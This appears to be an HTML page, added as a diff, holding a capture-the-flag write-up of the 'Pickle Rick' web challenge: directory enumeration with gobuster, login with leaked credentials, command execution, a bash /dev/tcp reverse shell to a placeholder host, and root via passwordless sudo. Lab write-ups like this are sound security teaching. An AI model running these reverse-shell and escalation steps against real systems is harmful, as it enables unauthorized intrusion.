@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Pickle Rick CTF</title>
+    
+    <link rel="shortcut icon" href="../img/favicon.ico" type="image/x-icon" />
+    <link rel="stylesheet" href="../css/main.css" />
+    <link rel="stylesheet" href="../css/media.css" />
+    <link rel="stylesheet" href="../css/writeups.css" />
+    
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css"
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+
+    <script defer src="../js/writeups.js"></script>
+</head>
+
+<body class="left-aligned-hero">
+
+    <!-- Navbar Placeholder -->
+    <div id="nav-placeholder"></div>
+
+    <!-- Content Wrapper -->
+    <div id="content" class="fade-in">
+      
+      <!-- Hero Section -->
+      <section id="home" class="hero">
+        <div class="container container-lg">
+            <a href="../writeups.html" class="back-arrow" data-aos="fade-right" data-aos-duration="1000">
+                ← Back to Writeups
+            </a>
+            <div class="hero-content">
+                <div class="hero-image" data-aos="fade-up" data-aos-duration="1000">
+                    <img src="../img/writeups/pickle_rick/pickle rick.jpeg" alt="Pickle Rick CTF" />
+                </div>
+                <h1 class="hero-heading" data-aos="fade-up" data-aos-duration="1200">Pickle Rick CTF</h1>
+                <p class="writeup-meta" data-aos="fade-up" data-aos-duration="1400">
+                    <strong>Category:</strong> Web Hacking | <strong>Difficulty:</strong> Easy | <strong>Date:</strong> Feb 08, 2025
+                </p>
+                <p class="writeup-summary" data-aos="fade-up" data-aos-duration="1600">
+                    Exploit a web server to retrieve three secret ingredients to help Rick transform back into a human.
+                </p>
+            </div>
+        </div>
+      </section>
+
+      <!-- Writeup Content -->
+      <section id="writeup-content" class="writeup-content">
+        <div class="container">
+          <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Introduction</h2>
+          <p data-aos="fade-right" data-aos-duration="1200">
+            This challenge involved exploiting a web application to retrieve three secret ingredients required for Rick's potion.
+            The main tasks included directory enumeration, login bypass, and privilege escalation.
+          </p>
+
+          <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Step 1: Enumerating the Web Server</h2>
+          <p data-aos="fade-right" data-aos-duration="1200">
+            The first step was to scan the web server for hidden directories and files using <strong>gobuster</strong>:
+          </p>
+          <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+            <code>
+              gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip -o  pickle.txt
+            </code>
+          </pre>
+          <img src="../img/writeups/pickle_rick/pickle_rick1.png" alt="Gobuster Scan Results" width="800" data-aos="fade-right" data-aos-duration="1000">
+
+          <p data-aos="fade-right" data-aos-duration="1200">
+            The scan revealed interesting directories, including:
+          </p>
+          <ul>
+            <li><strong>/index.html</strong> - Contained a username: <strong>R1ckRul3s</strong></li>
+            <li><strong>/robots.txt</strong> - Contained a potential password: <strong>WubbaLubbaDubDub</strong></li>
+            <li><strong>/login.php</strong> - A login portal requiring credentials</li>
+          </ul>
+
+          <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Step 2: Logging In</h2>
+          <p data-aos="fade-right" data-aos-duration="1200">
+            Using the username and password found, I attempted to log in to the /login.php portal.
+            I successfully authenticated with:
+          </p>
+          <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+            <code>
+              Username: R1ckRul3s
+              <br>
+              Password: WubbaLubbaDubDub
+            </code>
+          </pre>
+          <p data-aos="fade-right" data-aos-duration="1200">
+            After logging in, I gained access to a restricted panel where commands could be executed.
+          </p>
+          <img src="../img/writeups/pickle_rick/pickle_rick2.png" alt="Gobuster Scan Results" width="800" data-aos="fade-right" data-aos-duration="1000">
+
+          <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Step 3: Retrieving the First Ingredient</h2>
+          <p data-aos="fade-right" data-aos-duration="1200">
+            Running <code>ls</code> in the command panel revealed a file containing the first ingredient:
+          </p>
+          <img src="../img/writeups/pickle_rick/pickle_rick3.png" alt="Gobuster Scan Results" width="800" data-aos="fade-right" data-aos-duration="1000">
+          <p>So I tried to display the ingredient and got an error, has I coudln't see the inside of the file, unless I was the REAL RICK. 
+          </p>
+          <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+            <code>
+              cat Sup3rS3cretPickl3Ingred.txt
+            </code>
+          </pre>
+
+
+          <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Step 4: Privilege Escalation & Finding Remaining Ingredients</h2>
+          <p data-aos="fade-right" data-aos-duration="1200">
+            I then decided to create a reverse shell using <strong>bash</strong> and <strong>netcat</strong>:</p>
+            <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+            <code>
+                bash -c 'bash -i >& /dev/tcp/x.x.x.x/8080 0>&1'
+            </code>
+            </pre>
+            <p data-aos="fade-right" data-aos-duration="1200">
+            I was then able to display the first ingredient:  
+            <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+                <code>
+                cat Sup3rS3cretPickl3Ingred.txt
+                <br>
+                Output: mr. meeseek hair
+                </code>
+              </pre>
+            <p data-aos="fade-right" data-aos-duration="1200">
+            I then navigated to Rick's home directory <code>/home/rick</code>, where I found another file:
+            </p>
+          <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+            <code>
+              cat second_ingredient.txt
+              <br>
+              Output: 1 jerry tear
+            </code>
+          </pre>
+          <p data-aos="fade-right" data-aos-duration="1200">
+            Checking <code>sudo -l</code> revealed that <strong>www-data</strong> had root access without requiring a password.
+            I escalated privileges to <strong>root</strong> and navigated to the root directory to find the final ingredient:
+          </p>
+          <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+            <code>
+              sudo bash -i
+              <br>
+              cd /root
+              <br>
+              cat 3rd.txt
+              <br>
+              Output: fleeb juice
+            </code>
+          </pre>
+
+          <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Conclusion</h2>
+          <p data-aos="fade-right" data-aos-duration="1200">
+            This challenge reinforced essential <strong>web exploitation</strong> techniques by demonstrating how to identify and exploit vulnerabilities in a web application. The key takeaways include:
+          </p>
+          <ul data-aos="fade-right" data-aos-duration="1300">
+            <li>
+              <strong>Directory Enumeration:</strong> By scanning the web server for hidden directories and files, we uncovered sensitive information such as usernames, passwords, and login portals that provided access to restricted areas.
+            </li>
+            <li>
+              <strong>Credential-based Authentication Bypass:</strong> Using the discovered credentials from the enumeration step, we successfully bypassed authentication mechanisms, gaining access to restricted resources within the system.
+            </li>
+            <li>
+              <strong>Privilege Escalation:</strong> Once inside, further analysis allowed us to escalate our privileges by leveraging misconfigurations or additional vulnerabilities, ultimately retrieving high-value files and system information.
+            </li>
+          </ul>
+          <p data-aos="fade-right" data-aos-duration="1400">
+            These methodologies are fundamental in penetration testing and cybersecurity, emphasizing the importance of proper web application security measures, including restricting access to sensitive files, implementing strong authentication mechanisms, and monitoring for unauthorized access attempts.
+          </p>
+        </div>
+      </section>
+    </div>
+
+    <!-- Footer Placeholder -->
+    <div id="footer-placeholder"></div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+    <script src="../js/components.js"></script>
+    <script type="module" src="../js/main.js"></script>
+    <script>
+      AOS.init({
+        duration: 1000,
+        easing: 'ease-in-out',
+        once: true,
+      });
+      document.addEventListener("DOMContentLoaded", () => {
+        document.getElementById("content").classList.add("fade-in-active");
+      });
+    </script>
+</body>
+</html>
